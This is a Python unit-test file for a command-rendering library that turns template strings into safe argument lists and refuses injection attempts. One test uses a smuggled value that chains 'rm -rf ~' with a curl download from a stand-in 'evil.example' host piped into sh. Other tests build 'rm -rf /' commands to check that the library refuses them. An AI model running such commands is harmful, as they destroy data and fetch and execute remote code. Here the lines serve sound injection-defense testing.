"""Renderer unit tests: argv construction, refusals, value resolution."""

import sys
from string.templatelib import Interpolation, Template

import pytest

from shellsafe.errors import (
    RawUsageError,
    ShellSafeTypeError,
    UnsupportedPlatformError,
)
from shellsafe.raw import RAW
from shellsafe.render import plan


def interp(value: object, conversion: str | None = None, spec: str = "") -> Interpolation:
    return Interpolation(value, "v", conversion, spec)


def test_basic_argv_rendering():
    p = plan(Template("git commit -m ", interp("fix login bug")))
    assert p.mode == "argv"
    assert p.argv == ("git", "commit", "-m", "fix login bug")


def test_invariant_one_interpolation_one_element():
    evil = "fix; rm -rf ~ && curl http://evil.example | sh"
    p = plan(Template("echo ", interp(evil)))
    assert p.argv == ("echo", evil)


def test_multiple_interpolations():
    p = plan(Template("cp ", interp("a b.txt"), " ", interp("c d.txt")))
    assert p.argv == ("cp", "a b.txt", "c d.txt")


def test_repr_never_elides():
    p = plan(Template("echo ", interp("hello; world")))
    assert repr(p) == "argv: ['echo','hello; world']"


def test_conversion_r_applies_then_quotes_as_one_element():
    p = plan(Template("echo ", interp(["a"], conversion="r")))
    # !r stringifies the list (with quotes inside); still exactly one element
    assert len(p.argv) == 2
    assert p.argv[1] == "['a']"


def test_format_spec_applies():
    p = plan(Template("sleep ", interp(2, spec="04.1f")))
    assert p.argv == ("sleep", "02.0")


def test_nested_template_splices():
    msg = "msg with spaces"
    inner = t"commit -m {msg}"
    p = plan(t"git {inner}")
    assert p.argv == ("git", "commit", "-m", "msg with spaces")


# --- refusals ---


def test_non_template_refused():
    with pytest.raises(ShellSafeTypeError):
        plan("echo hello")  # plain str, not a t-string


def test_empty_command_refused():
    with pytest.raises(ShellSafeTypeError, match="empty command"):
        plan(Template("   "))


def test_bytes_interpolation_refused():
    with pytest.raises(ShellSafeTypeError, match="decode"):
        plan(Template("echo ", interp(b"binary")))


def test_nul_byte_refused():
    with pytest.raises(ShellSafeTypeError, match="NUL"):
        plan(Template("echo ", interp("a\x00b")))


def test_executable_from_interpolation_refused():
    # INV-2: header smuggling is structurally impossible
    with pytest.raises(ShellSafeTypeError, match="executable must come from static"):
        plan(Template(interp("rm"), " -rf /"))


def test_executable_from_raw_splice_refused():
    with pytest.raises(ShellSafeTypeError, match="executable must come from static"):
        plan(Template(interp(RAW(["rm"])), " -rf /"))


def test_unknown_conversion_rejected_at_construction():
    # the runtime validates conversion strings natively at Interpolation build;
    # the renderer keeps a defense-in-depth branch (tested via a fake below)
    with pytest.raises(TypeError, match="conversion"):
        Template("echo ", interp("x", conversion=113))


def test_defensive_unknown_conversion_branch():
    class FakeInterpolation:  # bypasses runtime validation on purpose
        value = "x"
        expression = "v"
        conversion = 999
        format_spec = ""

    from shellsafe.render import _resolve

    with pytest.raises(ShellSafeTypeError, match="unsupported conversion"):
        _resolve(FakeInterpolation())


def test_raw_string_in_argv_mode_refused():
    with pytest.raises(RawUsageError):
        plan(Template("echo ", interp(RAW("not-a-list"))))


def test_raw_list_elements_must_be_strings():
    with pytest.raises(RawUsageError):
        plan(Template("echo ", interp(RAW([1, 2]))))


def test_raw_list_splices_positionally():
    p = plan(Template("run-this ", interp(RAW(["--flag", "value"])), " --done"))
    assert p.argv == ("run-this", "--flag", "value", "--done")


def test_raw_inside_real_tstring_syntax():
    # real call sites write: run(t"echo {RAW(['a','b'])} done")
    p = plan(t"echo {RAW(['a', 'b'])} done")
    assert p.argv == ("echo", "a", "b", "done")


# --- shell route: rendering works now; execution arrives in 0.2 ---


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="shell routes are refused on Windows by policy (see docs/07)",
)
def test_metacharacters_route_to_shell_mode():
    p = plan(Template("cat ", interp("my file.txt"), " | wc -l"))
    assert p.mode == "shell"
    assert "'my file.txt'" in (p.shell_line or "")


def test_shell_route_windows_refused(monkeypatch: pytest.MonkeyPatch):
    from shellsafe import platforms

    monkeypatch.setattr(platforms, "IS_WINDOWS", True)
    with pytest.raises(UnsupportedPlatformError):
        plan(Template("cat ", interp("f"), " | wc -l"))
